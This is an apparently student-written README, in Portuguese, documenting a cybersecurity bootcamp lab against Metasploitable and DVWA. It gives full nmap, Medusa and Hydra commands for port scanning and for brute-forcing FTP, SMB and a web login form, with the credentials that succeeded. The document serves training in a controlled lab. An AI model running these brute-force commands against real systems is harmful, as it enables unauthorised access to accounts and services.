# Atividade Prática - Cibersegurança

Este repositório documenta as atividades práticas realizadas durante o bootcamp de Cibersegurança da DIO, com foco em testes de invasão em ambientes controlados utilizando ferramentas como **Nmap**, **Medusa** e **Hydra**.

---

## 🎯 Objetivos

- Realizar varredura de rede e identificação de portas abertas no Metasploitable.
- Criar wordlists de usuários e senhas para tentativas de acesso via FTP e SMB.
- Acessar a máquina Metasploitable via FTP e SMB.
- Realizar ataque de força bruta na página de login do **DVWA** (Damn Vulnerable Web Application).

---

## 🛠️ Ferramentas Utilizadas

- **Nmap** – Varredura de rede e portas
- **Medusa** – Ataque de força bruta
- **Hydra** – Ataque de força bruta (alternativa ao Medusa)
- **FTP** – Acesso remoto via File Transfer Protocol

---

## 📝 Relatório de Atividades

### 1. Acesso ao Metasploitable

#### Varredura de Portas
Comando utilizado para identificar portas abertas no alvo:
```bash
nmap -sV <IP_DO_METASPLOITABLE>
```
A varredura retornou todas as portas abertas do sistema.

#### Criação de Wordlists
Foram criadas duas wordlists: uma para usuários e outra para senhas.

Comandos:
```bash
echo -e "msfadmin\nadmin\nwelcome123\nusuario123\nsenha123\nlogin123" > usuarios.txt
echo -e "msfadmin\nadmin\nwelcome123\nusuario123\nsenha123\nlogin123" > senhas.txt
```

#### Ataque ao Serviço FTP
Comando Medusa para tentativa de acesso FTP:
```bash
medusa -h <IP_DO_METASPLOITABLE> -U usuarios.txt -P senhas.txt -M ftp -t 6
```
**Resultado:** Acesso bem-sucedido com:
- Usuário: `msfadmin`
- Senha: `msfadmin`

Conexão FTP testada com:
```bash
ftp <IP_DO_METASPLOITABLE>
```

#### Ataque ao Serviço SMB
Comando Medusa para acesso SMB:
```bash
medusa -h <IP_DO_METASPLOITABLE> -U usuarios.txt -P senhas.txt -M smbnt -t 2 -T 50
```
**Resultado:** Acesso bem-sucedido com as mesmas credenciais.

---

### 2. Acesso à Página DVWA

#### Ataque com Medusa
Comando utilizado:
```bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL:Login failed' -t 6
```

**Resultado:** Falha. Possível causa: token CSRF dinâmico na página de login.

#### Ataque com Hydra
Comando alternativo utilizado:
```bash
hydra -L usuarios.txt -P senhas.txt 192.168.56.101 http-post-form \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 6
```

**Resultado:** ✅ Sucesso no acesso.

---

## ✅ Conclusão

- Foi possível acessar o Metasploitable via FTP e SMB utilizando credenciais descobertas por força bruta.
- O ataque ao DVWA falhou com o Medusa devido a possíveis tokens CSRF, mas obteve sucesso com o Hydra.
- A atividade reforçou a importância de proteger serviços com credenciais fracas e a necessidade de mitigar ataques de força bruta.

---

> 📌 Nota: Todas as atividades foram realizadas em ambiente controlado e para fins educacionais.
